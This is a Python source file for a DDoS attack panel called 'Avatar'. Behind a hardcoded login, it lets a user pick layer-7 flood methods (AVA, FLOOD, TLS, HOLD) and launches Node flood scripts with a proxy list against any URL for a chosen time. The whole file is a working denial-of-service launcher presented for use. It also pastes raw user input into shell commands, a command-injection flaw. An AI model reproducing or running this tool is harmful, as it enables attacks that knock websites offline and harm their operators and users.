# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
                TYPE THE \x1b[38;5;166m[\033[32mMETHODS\x1b[38;5;166m] \x1b[38;5;166m[\033[32mURL\x1b[38;5;166m] \x1b[38;5;166m[\033[32mTIME\x1b[38;5;166m]\x1b[38;5;22m To Start Attack
                             \x1b[38;5;166mStay To ↓ For Update
                              t.me/avatara4ng
                         \x1b[38;5;46m• \x1b[38;5;46mAVA \x1b[38;5;46m[\x1b[38;5;46mL7]    • FLOOD  \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m] 
                         • TLS   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    • HOLD   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
                         •   -   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    •   -    \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
                         •   -   \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]    •   -    \x1b[38;5;46m[\x1b[38;5;46mL7\x1b[38;5;46m]
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
		   	 Type \x1b[38;5;166m[\033[32mhelp\x1b[38;5;166m] To See Use
                             t.me/avatara4ng⠀⠀
\033[0m""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] AstroDDoS :: Online Users: [1]")
		sin = input("\033[0;38;46mAVATAR\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  
		elif sinput == "AVA" or sinput == "ava":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd /root/File && node AVA.js {url} {time} 10 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd /root/File && node hold.js {url} {time} 10 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "FLOOD" or sinput == "flood":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd /root/File && node AVA.js {url} {time} 10 9 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()


		elif sinput == "HOLD" or sinput == "hold":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd /root/File && node mix.js {url} {time} 10 10 proxy.txt')
				print("\x1b[38;5;46mAttack Sent")
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
		
					
 
def login():
	sys.stdout.write(f"\x1b]2;[\] Avatar :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "root"
	passwd = "3"
	username = input("""
                           ▄▀█ █░█ ▄▀█ ▀█▀ ▄▀█ █▀█
                           █▀█ ▀▄▀ █▀█ ░█░ █▀█ █▀▄
                              Welcome To Avatar
						   
\x1b[38;5;166m[\033[32mUSERNAME\x1b[38;5;166m]:\033[0m """)
	password = getpass.getpass(prompt='\x1b[38;5;166m[\033[32mPASSWORD\x1b[38;5;166m]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\x1b[38;5;46mSuccessfully Login")
		time.sleep(1)
		main()

login()
